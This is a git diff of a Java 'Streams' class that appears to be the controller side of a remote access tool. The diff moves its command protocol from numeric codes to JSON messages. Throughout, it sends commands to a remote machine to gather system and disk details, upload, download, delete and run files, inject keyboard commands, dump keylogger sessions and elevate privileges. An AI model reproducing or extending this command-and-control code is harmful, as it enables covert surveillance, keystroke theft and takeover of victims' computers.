@@ -140,19 +140,24 @@ public class Streams {
     }
 
     public Object sendAction(Action action) throws IOException {
+        JSONObject object = new JSONObject();
         switch (action) {
             case SYS_INFO -> {
-                sendSize(0);
+                object.put("action", 0);
+                sendString(object.toString());
+                //sendSize(0);
                 List<String> informationList = readList();
                 return listToSystemInformation(informationList);
             }
             case NET_INFO -> {
-                sendSize(1);
+                object.put("action", 1);
+                sendString(object.toString());
                 String networkJSON = readString();
                 return listToNetworkInformation(networkJSON);
             }
             case DISK -> {
-                mainStream.sendSize(2);
+                object.put("action", 2);
+                mainStream.sendString(object.toString());
                 List<String> listOfDisks = readList();
                 System.out.println(listOfDisks);
                 return listOfDisks.toArray(new String[0]);
@@ -166,34 +171,42 @@ public class Streams {
         return null;
     }
 
-    public void sendAction(Action action, String destinationPath, int length) throws IOException {
+    public void sendAction(Action action, String destinationPath, int numOfFiles) throws IOException {
+        JSONObject jsonObject = new JSONObject();
         if (action == Action.UPLOAD) {
-            mainStream.sendSize(10);
-            sendString(destinationPath);
-            sendSize(length);
+            jsonObject.put("action", 10);
+            jsonObject.put("path", destinationPath);
+            jsonObject.put("num_of_files", numOfFiles);
+            mainStream.sendString(jsonObject.toString());
         }
     }
 
     public void sendAction(Action action, List<String> fileList, List<String> directoryList) throws IOException {
+        JSONObject jsonObject = new JSONObject();
         if (action == Action.COPY) {
-            mainStream.sendSize(6);
-            sendList(fileList);
-            sendList(directoryList);
+            jsonObject.put("action", 6);
+            jsonObject.put("file_list", fileList);
+            jsonObject.put("directory_list", directoryList);
+            mainStream.sendString(jsonObject.toString());
         }
     }
 
     public void sendAction(Action action, List<String> fileList, String directory) throws IOException {
+        JSONObject jsonObject = new JSONObject();
         if (action == Action.MOVE) {
-            mainStream.sendSize(7);
-            sendList(fileList);
-            sendString(directory);
+            jsonObject.put("action", 7);
+            jsonObject.put("file_list", fileList);
+            jsonObject.put("path", directory);
+            mainStream.sendString(jsonObject.toString());
         }
     }
 
     public List<String> sendAndReadAction(Action action, String name) throws IOException {
+        JSONObject object = new JSONObject();
         if (action == Action.R_A_DIR) {
-            mainStream.sendSize(3);
-            sendString(name);
+            object.put("action", 3);
+            object.put("path", name);
+            mainStream.sendString(object.toString());
             return new ArrayList<>(Arrays.asList(readString().split("\\|")));
         }
         return null;
@@ -209,14 +222,17 @@ public class Streams {
     }
 
     public void sendAction(Action action, String command) throws IOException {
+        JSONObject jsonObject = new JSONObject();
         switch (action) {
             case KEYBOARD_COMMAND -> {
-                sendSize(18);
-                sendString(command);
+                jsonObject.put("action", 18);
+                jsonObject.put("command", command);
+                mainStream.sendString(jsonObject.toString());
             }
             case BOX_MESSAGE -> {
-                sendSize(21);
-                sendString(command);
+                jsonObject.put("action", 21);
+                jsonObject.put("command", command);
+                mainStream.sendString(jsonObject.toString());
             }
 
         }
@@ -235,28 +251,32 @@ public class Streams {
 
 
     public void sendAction(Action action, List<String> fileList) throws IOException {
+        JSONObject jsonObject = new JSONObject();
         switch (action) {
             case DOWNLOAD -> {
-                mainStream.sendSize(5);
-                sendList(fileList);
+                jsonObject.put("action",5);
+                jsonObject.put("file_list", fileList);
+                mainStream.sendString(jsonObject.toString());
             }
             case DELETE -> {
-                mainStream.sendSize(8);
-                sendList(fileList);
+                jsonObject.put("action",8);
+                jsonObject.put("file_list", fileList);
+                mainStream.sendString(jsonObject.toString());
             }
             case RUN -> {
-                mainStream.sendSize(9);
-                sendList(fileList);
+                jsonObject.put("action", 9);
+                jsonObject.put("file_list", fileList);
+                mainStream.sendString(jsonObject.toString());
             }
         }
     }
 
     public void sendAction(KeyloggerEvents event, String nameOfSession) throws IOException {
-        System.out.println(event);
+        JSONObject jsonObject = new JSONObject();
         switch (event) {
             case DUMP_LAST -> {
-                System.out.println("huyyy");
-                mainStream.sendSize(4);
+                jsonObject.put("action", 4);
+                mainStream.sendString(jsonObject.toString());
                 if (readSize()!=-1) {
                     receiveFile(nameOfSession);
                     FolderOpener.open(nameOfSession);
@@ -265,7 +285,8 @@ public class Streams {
                 }
             }
             case DUMP_ALL -> {
-                mainStream.sendSize(14);
+                jsonObject.put("action", 14);
+                mainStream.sendString(jsonObject.toString());
                 if (readSize()!=-1) {
                     receiveLogs(nameOfSession);
                     FolderOpener.open(nameOfSession);
@@ -303,13 +324,11 @@ public class Streams {
     }
 
     public int sendAndReadAction(Permissions permissions) throws IOException {
+        JSONObject object = new JSONObject();
         switch (permissions) {
-            case IS_ADMIN -> {
-                sendSize(19);
-                return readSize();
-            }
             case ELEVATE_PRIVILEGES -> {
-                sendSize(20);
+                object.put("action", 20);
+                mainStream.sendString(object.toString());
                 return readSize();
             }
 
